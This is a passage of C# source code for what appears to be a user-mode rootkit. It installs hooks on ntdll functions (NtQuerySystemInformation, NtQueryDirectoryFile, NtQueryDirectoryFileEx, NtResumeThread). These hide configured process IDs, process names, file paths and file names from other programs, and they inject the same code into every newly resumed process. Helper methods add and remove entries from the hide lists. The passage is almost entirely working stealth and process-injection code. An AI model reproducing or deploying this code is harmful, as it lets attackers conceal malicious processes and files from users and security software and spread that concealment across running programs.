                if (procHandle != IntPtr.Zero && Utils.ShouldInject(procHandle) && JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 10))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 10ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
                {
                    SharpInjector.Inject(procHandle, Program.InjectionEntryPoint, 100);//make sure to change this on a namespace or class or function name change
                }
                NativeMethods.CloseHandle(procHandle);
            }
            return OriginalNtResumeThread(ThreadHandle, SuspendCount);
        }

        public static bool MimicNtResumeThreadInject(int procId) 
        {
            uint THREAD_SUSPEND_RESUME = 0x0002;
            uint THREAD_QUERY_INFORMATION = 0x0040;
            IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights((int)procId);
            if (procHandle == IntPtr.Zero) 
            {
                return false;
            }

            if (NativeMethods.NtGetNextThread(procHandle, IntPtr.Zero, THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, 0, 0, out IntPtr ThreadHandle) != 0) 
            {
                NativeMethods.CloseHandle(procHandle);
                return false;
            }
            if (JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 10))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 10ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
            {
                SharpInjector.InjectionStatusCode status= SharpInjector.Inject(procHandle, Program.InjectionEntryPoint, 100);//make sure to change this on a namespace or class or function name change
                NativeMethods.CloseHandle(procHandle);
                if (status == SharpInjector.InjectionStatusCode.SUCCESS) 
                {
                    return true;
                }
            }
            NativeMethods.CloseHandle(procHandle);
            return false;
        }

        public static void Start()
        {
            if (Started)
            {
                return;
            }

            IntPtr[] PausedThreads=Utils.PauseAllThreadExceptCurrent();
            try
            {
                IntPtr NtQuerySystemInformationPtr = Utils.GetFunctionPtr("ntdll.dll", "NtQuerySystemInformation");
                Delegate tempDelegate = new NtQuerySystemInformationDelegate(NtQuerySystemInformationHook);
                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
                IntPtr NtQuerySystemInformationPtrHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
                contextManager["NtQuerySystemInformation"] = new NativeFunctionHooker(NtQuerySystemInformationPtr, NtQuerySystemInformationPtrHookPtr);
                OriginalNtQuerySystemInformation = contextManager["NtQuerySystemInformation"].InstallHook<NtQuerySystemInformationDelegate>();

                IntPtr NtQueryDirectoryFilePtr = Utils.GetFunctionPtr("ntdll.dll", "NtQueryDirectoryFile");
                tempDelegate = new NtQueryDirectoryFileDelegate(NtQueryDirectoryFileHook);
                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
                IntPtr NtQueryDirectoryFileHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
                contextManager["NtQueryDirectoryFile"] = new NativeFunctionHooker(NtQueryDirectoryFilePtr, NtQueryDirectoryFileHookPtr);
                OriginalNtQueryDirectoryFile = contextManager["NtQueryDirectoryFile"].InstallHook<NtQueryDirectoryFileDelegate>();

                IntPtr NtQueryDirectoryFileExPtr = Utils.GetFunctionPtr("ntdll.dll", "NtQueryDirectoryFileEx");
                tempDelegate = new NtQueryDirectoryFileExDelegate(NtQueryDirectoryFileExHook);
                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
                IntPtr NtQueryDirectoryFileHookExPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
                contextManager["NtQueryDirectoryFileEx"] = new NativeFunctionHooker(NtQueryDirectoryFileExPtr, NtQueryDirectoryFileHookExPtr);
                OriginalNtQueryDirectoryFileEx = contextManager["NtQueryDirectoryFileEx"].InstallHook<NtQueryDirectoryFileExDelegate>();

                IntPtr NtResumeThreadPtr = Utils.GetFunctionPtr("ntdll.dll", "NtResumeThread");
                tempDelegate = new NtResumeThreadDelegate(NtResumeThreadHook);
                DelgateCache.Add(tempDelegate);//add to a cache or else the Garbage collector will collect it and mess things up
                IntPtr NtResumeThreadHookPtr = Marshal.GetFunctionPointerForDelegate(tempDelegate);
                contextManager["NtResumeThread"] = new NativeFunctionHooker(NtResumeThreadPtr, NtResumeThreadHookPtr);
                OriginalNtResumeThread = contextManager["NtResumeThread"].InstallHook<NtResumeThreadDelegate>();
            }
            finally 
            {
                Utils.ResumeAndCloseAllThreads(PausedThreads);
            }




            Started = true;
            //Console.WriteLine("injected all");
        }
        public static void Stop()
        {
            if (!Started)
            {
                return;
            }
            IntPtr[] PausedThreads = Utils.PauseAllThreadExceptCurrent();

            foreach (NativeFunctionHooker i in contextManager.Values)
            {
                try//this cannot be allowed to error or else something is going to be frozen and fuck things up (in the injected application)
                {
                    i.RemoveHook();
                }
                catch 
                { 
                
                }
            }

            Utils.ResumeAndCloseAllThreads(PausedThreads);
            contextManager.Clear();
            DelgateCache.Clear();
            Started = false;
        }

        public static void setup(int[] pids, string[] ProcessNames, string[] FilePaths, string[] FileNames) 
        {
            if (!HidePids.SequenceEqual(pids)) 
            {
                HidePids.Clear();
                HidePids.AddRange(pids);
            }

            if (!HideProcessNames.SequenceEqual(ProcessNames)) 
            {
                HideProcessNames.Clear();
                HideProcessNames.AddRange(ProcessNames);
            }

            if (!HideFilePaths.SequenceEqual(FilePaths)) 
            {
                HideFilePaths.Clear();
                HideFilePaths.AddRange(FilePaths);
            }
            
            if (!HideFileNames.SequenceEqual(FileNames))
            {
                HideFileNames.Clear();
                HideFileNames.AddRange(FileNames);
            }
        }

        public static int[] GetHiddenPids() 
        {
            return HidePids.ToArray();
        }

        public static void ClearHiddenPids()
        {
            HidePids.Clear();
        }

        public static void HidePid(int pid)
        {
            if (pid == 0) 
            {
                throw new Exception("Cant hide System!");
            }
            HidePids.Add(pid);
        }

        public static void UnHidePid(int pid) 
        {
            HidePids.Remove(pid);
        }

        public static string[] GetHiddenProcessNames() 
        {
            return HideProcessNames.ToArray();
        }

        public static void ClearHiddenProcessNames() 
        {
            HideProcessNames.Clear();
        }

        public static void HideProcessName(string procName) 
        {
            HideProcessNames.Add(procName.ToLower());
        }

        public static void UnHideProcessName(string procName)
        {
            HideProcessNames.Remove(procName.ToLower());
        }

        public static string[] GetHiddenFilePaths() 
        {
            return HideFilePaths.ToArray();
        }

        public static void ClearHiddenFilePaths() 
        {
            HideFilePaths.Clear();
        }

        public static void HideFilePath(string filePath) 
        {
            if (filePath.Replace(".", "").Replace("\\", "") == "") 
            {
                throw new Exception("You cant supply that as a FilePath!");
            }
            if (filePath.StartsWith("\\\\?\\"))
            {
                filePath = filePath.Substring(4);
            }
            HideFilePaths.Add(filePath.ToLower());
        }

        public static void UnHideFilePath(string filePath)
        {
            if (filePath.StartsWith("\\\\?\\"))
            {
                filePath = filePath.Substring(4);
            }
            HideFilePaths.Remove(filePath.ToLower());
        }

        public static string[] GetHiddenFileNames()
        {
            return HideFileNames.ToArray();
        }

        public static void ClearHiddenFileNames()
        {
            HideFileNames.Clear();
        }

        public static void HideFileName(string fileName)
        {
            if (fileName.Replace(".", "").Replace("\\", "") == "")
            {
                throw new Exception("You cant supply that as a FilePath!");
            }
            HideFileNames.Add(fileName.ToLower());
        }

        public static void UnHideFileName(string fileName)
        {
            HideFileNames.Remove(fileName.ToLower());
        }

        public static void ClearAll() 
        {
            ClearHiddenPids();
            ClearHiddenProcessNames();
            ClearHiddenFileNames();
            ClearHiddenFilePaths();
        }

    }
}
